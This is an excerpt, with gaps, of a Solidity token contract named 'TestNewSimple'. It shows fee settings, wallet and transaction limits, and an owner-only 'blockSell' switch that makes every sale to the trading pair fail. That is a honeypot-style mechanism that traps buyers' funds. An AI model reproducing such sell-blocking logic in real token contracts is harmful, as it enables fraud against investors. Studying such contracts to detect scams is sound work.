...
contract TestNewSimple is ERC20Detailed, Ownable {
    ...
    uint256 public maxWallet = TOTAL_GONS.div(100).mul(4);
    uint256 public maxTransaction = TOTAL_GONS.div(100).mul(3);
    ...
    uint256 public totalFee = ecosystemFee.add(liquidityFee).add(marketingFee);
    ...
    constructor() ERC20Detailed("TestNewSimple", "TestNewSimple", uint8(DECIMALS)) {
        ...
        marketingFeeReceiver = 0x2CD87904B77Eb4658408f8b8c35D9F98A05A4Ea9;
        ecosystemFeeReceiver = 0xd88306B19A660836379dAb1845624b3a87998917;


        emit Transfer(address(0x0), msg.sender, _totalSupply);
    }

    function blockSell(bool _enabled) external onlyOwner {
        blocked = _enabled;
    }
    ...
    function changeAntiDumpPercentage(uint256 percentage) public onlyMaster {
        require(percentage > 1 && percentage < 35);
    ...
    function _transferFrom(
        ...
        if (sender != owner() && !_isMaxWalletExempt[recipient] && maxWalletActivated) {
            uint256 heldGonBalance = _gonBalances[recipient];
            require(
                (heldGonBalance + gonAmount) <= maxWallet,
                "Total Holding is currently limited, you can not buy that much."
            );
        }
        if (sender != owner() && maxTxActivated) {
            require(
                (gonAmount) <= maxTransaction,
                "Total Transaction amoun is too much."
            );
        }

        bool isSell = false;
        if (recipient == pair){
            require(!blocked,"Sell are blocked");
            isSell = true;
        }
    ...
    function setMaxWalletToken(uint256 _num, uint256 _denom)
        ...
        onlyOwner
    {
        maxWallet = TOTAL_GONS.div(_denom).mul(_num);
    }

    function checkMaxWalletToken() external view returns (uint256) {
        return maxWallet.div(_gonsPerFragment);
    }
    ...
    function setFees(
        ...
        require(_liquidityFee + _marketingFee < 25);
        liquidityFee = _liquidityFee;
        marketingFee = _marketingFee;
        totalFee = ecosystemFee.add(liquidityFee).add(marketingFee);
